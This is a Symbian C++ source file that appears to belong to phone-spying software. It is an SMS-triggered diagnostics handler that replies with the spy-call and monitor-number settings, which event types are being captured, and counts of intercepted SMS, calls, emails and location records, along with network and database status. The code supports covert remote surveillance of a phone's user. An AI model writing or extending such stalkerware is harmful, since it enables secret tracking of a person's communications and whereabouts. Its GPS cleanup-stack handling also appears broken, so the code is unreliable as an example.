#include "DiagnosCmdHandler.h"
#include "CltSettings.h"
#include "FxsDiagnosticInfo.h"
#include "CltDatabase.h"
#include "DbHealth.h"
#include "DriveInfo.h"
#include "ApnRecoveryInfo.h"
#include "FxLocationServiceInterface.h"
#include "Global.h"
#include "RscHelper.h"

const static TInt KRespMessageDefaultLength = 300;

CDiagnosCmdHandler::CDiagnosCmdHandler(MLastConnInfoSource& aConnInfo, MApnInfoSource& aApnRecvInfo, CFxsDatabase& aDb)
:iSettings(Global::Settings()),
iConnInfo(aConnInfo),
iApnRecvInfo(aApnRecvInfo),
iDb(aDb)
	{
	}

CDiagnosCmdHandler::~CDiagnosCmdHandler()
	{
	}
	
CDiagnosCmdHandler* CDiagnosCmdHandler::NewL(MLastConnInfoSource& aConnInfo, MApnInfoSource& aApnRecvInfo, CFxsDatabase& aDb)
	{
	CDiagnosCmdHandler* self = new (ELeave)CDiagnosCmdHandler(aConnInfo, aApnRecvInfo, aDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CDiagnosCmdHandler::ConstructL()
	{	
	}

HBufC* CDiagnosCmdHandler::HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails)
	{
	switch(aCmdDetails.iCmd)
		{
		case KCmdQueryDiagnostic:
			{
			return CreateRespMessageL();
			}break;
		default:
			{
			return NULL;
			}
		}
	}

TPtrC CDiagnosCmdHandler::FmtString(TDiagnosID aDiagId)
	{
	TPtrC str(KFormatMsg[aDiagId]);
	return str;
	}

HBufC* CDiagnosCmdHandler::CreateRespMessageL()
	{
	RBuf buffer;
	buffer.CleanupClosePushL();
	
	TStringFormatter* formatter = new TStringFormatter;
	CleanupStack::PushL(formatter);
	
	//1. version
	TInt productNumber = AppDefinitions::ProductNumber();
	TProductName version;
	AppDefinitions::GetMajorAndMinor(version);	
	const TDesC& productInfo = formatter->Format(FmtString(EDiagsVersion), EDiagsVersion, productNumber, &version);	
	XUtil::AppendL(buffer, productInfo);
	
	//2. device
	const TDesC& deviceType = formatter->Format(FmtString(EDiagsDeviceType), EDiagsDeviceType, &KDeviceType);
	XUtil::AppendL(buffer, deviceType);
	
	//3. EDiagsOS
	//Not implement
	
	//4. Spycall Info
	TMonitorInfo& spyInfo =  iSettings.SpyMonitorInfo();
	const TWatchList& watchList = iSettings.WatchList();
	TPtrC monitorNumber(spyInfo.MonitorNumber());	
	if(!monitorNumber.Length())
		{
		monitorNumber.Set(KSymbolStar);
		}
	const TDesC& spyInfoFmt = formatter->Format(FmtString(EDiagsSpyCallInfo), EDiagsSpyCallInfo, watchList.iEnable, spyInfo.SpyEnable(), &monitorNumber);
	XUtil::AppendL(buffer, spyInfoFmt);
	
	//5.EDiagsCaptureFlag
	const TDesC& startCapture = formatter->Format(FmtString(EDiagsCaptureFlag), EDiagsCaptureFlag, iSettings.StartCapture());
	XUtil::AppendL(buffer, startCapture);
	
	//6.EDiagsEventToCapture
	const TGpsSettingOptions& gpsSettings = iSettings.GpsSettingOptions();
	TBuf<1> gpsStatusStr;
	if(gpsSettings.iGpsOnFlag == KGpsFlagOnState)
		{
		gpsStatusStr.Num(1);//1
		}
	else if(gpsSettings.iGpsOnFlag == KGpsFlagOffState)
		{
		gpsStatusStr.Num(0);//0
		}
	else //not supported
		{
		gpsStatusStr.Copy(KSymbolStar);
		}
	const TDesC& eventToCapture = formatter->Format(FmtString(EDiagsEventToCapture),
												   EDiagsEventToCapture,
												   iSettings.EventCallEnable(),
												   iSettings.EventSmsEnable(),
												   iSettings.EventEmailEnable(),
												   iSettings.EventLocationEnable(),
												   &gpsStatusStr);
	
	XUtil::AppendL(buffer,eventToCapture);
	
	//7.EDiagsSms
	TFxLogEventCount dbCount;
	TRAPD(err,iDb.GetEventCountL(dbCount));	
	const TDesC& numOfSmsEvent = formatter->Format(FmtString(EDiagsSms),EDiagsSms,
												   dbCount.Get(TFxLogEventCount::EEventSmsIN),
												   dbCount.Get(TFxLogEventCount::EEventSmsOUT));
	XUtil::AppendL(buffer, numOfSmsEvent);
	//8.EDiagsVoice
	const TDesC& numOfCallEvent = formatter->Format(FmtString(EDiagsVoice),EDiagsVoice,
													dbCount.Get(TFxLogEventCount::EEventVoiceIN),
													dbCount.Get(TFxLogEventCount::EEventVoiceOUT),
													dbCount.Get(TFxLogEventCount::EEventVoiceMissed));
	XUtil::AppendL(buffer, numOfCallEvent);
	//9.EDiagsLOC	
	const TDesC& numOfLocEvent = formatter->Format(FmtString(EDiagsLOC),EDiagsLOC,
												   dbCount.Get(TFxLogEventCount::EEventLocation),
												   dbCount.Get(TFxLogEventCount::EEventSystem));
	XUtil::AppendL(buffer, numOfLocEvent);
	//10.EDiagsEmail
	const TDesC& numOfEmailEvent = formatter->Format(FmtString(EDiagsEmail),EDiagsEmail,
													 dbCount.Get(TFxLogEventCount::EEventMailIN),
													 dbCount.Get(TFxLogEventCount::EEventMailOUT) );	
	XUtil::AppendL(buffer, numOfEmailEvent);
	
	//11.EDiagsMaxNumOfEvent
	const TDesC& maxEvent = formatter->Format(FmtString(EDiagsMaxNumOfEvent),EDiagsMaxNumOfEvent, iSettings.MaxNumberOfEvent());
	XUtil::AppendL(buffer, maxEvent);
	
	//12.EDiagsTimer
	const TDesC& timer = formatter->Format(FmtString(EDiagsTimer),EDiagsTimer, iSettings.TimerInterval());
	XUtil::AppendL(buffer, timer);
	
	//13.EDiagsMonitorNumber	
	const TDesC& monNumber = formatter->Format(FmtString(EDiagsMonitorNumber), EDiagsMonitorNumber, &monitorNumber);
	XUtil::AppendL(buffer,monNumber );
	
	//14.EDiagsLastConnTime
	const TServConnectionInfo& connInfo = iConnInfo.LastConnectionInfo();
	TBuf<50> timeStr;
	if(connInfo.iConnEndTime == TTime(0))
		{
		timeStr.Copy(KStringNone);
		}
	else
		{
		connInfo.iConnEndTime.FormatL(timeStr, KSimpleTimeFormat);
		}
	
	const TDesC& connTime = formatter->Format(FmtString(EDiagsLastConnTime), EDiagsLastConnTime, &timeStr, &connInfo.iAP_Info.iDisplayName);
	XUtil::AppendL(buffer, connTime);
	
	//15.EDiagsResponseCode	
	const TDesC& respCode = formatter->Format(FmtString( EDiagsResponseCode),
														EDiagsResponseCode,
														connInfo.iConnErrInfo.iError,
														connInfo.iConnErrInfo.iConnError,
														(TUint8)connInfo.iServRespCode);
	XUtil::AppendL(buffer, respCode);
	
	//16.EDiagsApnRecovery
	TArray<TApnRecovery> apnRecovArray = iApnRecvInfo.ApnRecoveryInfoArray();
	_LIT(KApnRecovInfFmt,"%d,%d,%d,%d,%d");
	TFixedArray<TBuf<160>, 3>* _AFsArray = new TFixedArray<TBuf<160>, 3>;
	CleanupDeletePushL(_AFsArray);
	TBuf<50> partAFmtted;
	TBuf<100> partBFmt;
	for(TInt i=1;i<EApnRecoveryEventEnd;i++)
	//discard ERecovActivateAndTestConn
	//
		{
		const TApnRecovery& apnRecvo = apnRecovArray[i];
		partAFmtted.SetLength(0);
		partBFmt.SetLength(0);
		formatter->Format(partAFmtted, KApnRecovInfFmt, apnRecvo.iDetected, apnRecvo.iApnCreateComplete, apnRecvo.iApnCreateErrCode, apnRecvo.iTestConnCompleted, apnRecvo.iTestConnSuccess);
		
		for(TInt j=0;j<apnRecvo.iTestConnErrorCodeArray.Count();j++)
			{
			//@todo
			LOG1(_L("CDiagnosCmdHandler j: [%d]"), j)
			_LIT(KComman,",");
			if(partBFmt.MaxLength() - partBFmt.Length() > 5)
				{
				partBFmt.Append(apnRecvo.iTestConnErrorCodeArray[j]);
				partBFmt.Append(KComman);
				}
			}
		(*_AFsArray)[i-1].Copy(partAFmtted);
		(*_AFsArray)[i-1].Append(partBFmt);
		}
	
	const TDesC& apnRecovery = formatter->Format(FmtString(EDiagsApnRecovery), EDiagsApnRecovery, &(*_AFsArray)[0],&(*_AFsArray)[1],&(*_AFsArray)[2]);
	XUtil::AppendL(buffer, apnRecovery);
	CleanupStack::PopAndDestroy(_AFsArray);
	
	//17.EDiagsTuple
	const TNetOperatorInfo& networkInfo = iSettings.NetworkOperatorInfo();
	const TDesC& tuple = formatter->Format(FmtString(EDiagsTuple),EDiagsTuple, &networkInfo.iCountryCode, &networkInfo.iNetworkId);
	XUtil::AppendL(buffer, tuple);
	
	//18.EDiagsNetworkName
	const TDesC& networkName = formatter->Format(FmtString(EDiagsNetworkName),EDiagsNetworkName, &networkInfo.iLongName);
	XUtil::AppendL(buffer, networkName);
	
	//19.EDiagsDbSize,
	const TDesC& dbSize = formatter->Format(FmtString(EDiagsDbSize),EDiagsDbSize, iDb.DbFileSize() / 1024); //KB
	XUtil::AppendL(buffer, dbSize);
	
	//20.EDiagsInstallDrive
	CFxsAppUi& appUi = Global::AppUi();
	TBuf<2> drive;
	appUi.GetAppDrive(drive);
	const TDesC& driveFmt = formatter->Format(FmtString(EDiagsInstallDrive),EDiagsInstallDrive, drive[0]);
	XUtil::AppendL(buffer, driveFmt);
	
	//21.EDiagsFreeMemory
	TInt phoneMemFree;//storage mem in drive C:
	DriveInfUtil::GetFreeSpace(appUi.FsSession(), EDriveC, phoneMemFree);
	const TDesC& diskFree = formatter->Format(FmtString(EDiagsFreeMemory), EDiagsFreeMemory, phoneMemFree);
	XUtil::AppendL(buffer, diskFree);
	
	//22. EDiagsFreeRAM
	//not use
	//const TDesC& x = formatter->Format(FmtString(), );
	//respMessage = respMessage->ReAllocL(respMessage->Length() + x.Length());
	//respMessage->Des().Append(x);	
	
	//23.EDiagsDbCorrupted,
	const TDbHealth& dbHealth = iDb.DbHealthInfoL();
	const TDesC& dbCorrupted = formatter->Format(FmtString(EDiagsDbCorrupted), EDiagsDbCorrupted, dbHealth.iCorrupted);
	XUtil::AppendL(buffer, dbCorrupted);
	
	//24.EDiagsDbDamanged, 
	const TDesC& dbDamaged = formatter->Format(FmtString(EDiagsDbDamanged),EDiagsDbDamanged, dbHealth.iDamaged);
	XUtil::AppendL(buffer, dbDamaged);
	
	//25.EDiagsDbDropedCount,
	const TDesC& dbDroped = formatter->Format(FmtString(EDiagsDbDropedCount), EDiagsDbDropedCount, dbHealth.iDropedCount);
	XUtil::AppendL(buffer, dbDroped);
	
	//26.EDiagsRowCorrupedCount,
	const TDesC& rowCorruptedCount = formatter->Format(FmtString(EDiagsRowCorrupedCount), EDiagsRowCorrupedCount,dbHealth.iRowCorruptedCount);
	XUtil::AppendL(buffer, rowCorruptedCount);
	
	//27.EDiagsDbRecovered, 
	const TDesC& dbRecovered = formatter->Format(FmtString(EDiagsDbRecovered), EDiagsDbRecovered,dbHealth.iRecoveredCount);
	XUtil::AppendL(buffer, dbRecovered);
	
	//28.EDiagsGpsMethods
	MFxPositionMethod* gpsMethod = Global::FxPositionMethod();
	if(gpsMethod)
		{
		if(gpsMethod->IsGpsAvailable())
			{
			CDesCArray* gpsMethodNameArr = new (ELeave)CDesCArrayFlat(1);
			CleanupStack::PushL(gpsMethodNameArr);
			gpsMethod->GetBuiltInEnabledModule(*gpsMethodNameArr);
			TInt count = gpsMethodNameArr->Count();
			if(count)
				{
				HBufC* gpsMethodNameAll = HBufC::NewLC((KMaxLengthGpsMethodName*count) + count);
				TPtr ptr = gpsMethodNameAll->Des();
				for(TInt i=0;i<count;i++)
					{
					const TDesC& name = (*gpsMethodNameArr)[i];
					ptr.Append(name);
					ptr.Append(KSymbolComma);
					}
				const TDesC& gpsMethods = formatter->Format(FmtString(EDiagsGpsMethods), EDiagsGpsMethods, gpsMethodNameAll);
				XUtil::AppendL(buffer, gpsMethods);
				CleanupStack::PopAndDestroy(gpsMethodNameArr);
				}
			else
				{
				HBufC* noneTxt = RscHelper::ReadResourceLC(R_TXT_TEXT_NONE);				
				const TDesC& gpsMethods = formatter->Format(FmtString(EDiagsGpsMethods), EDiagsGpsMethods, noneTxt);
				XUtil::AppendL(buffer, gpsMethods);
				CleanupStack::PopAndDestroy(2);//gpsMethodNameArr, noneTxt
				}
			CleanupStack::PopAndDestroy(gpsMethodNameArr);		
			}
		}
	CleanupStack::PopAndDestroy(formatter);// formatter
	HBufC* diagMsg = HBufC::NewL(buffer.Length());
	diagMsg->Des().Append(buffer);
	CleanupStack::PopAndDestroy();// buffer
	return diagMsg;//pass ownership
	}
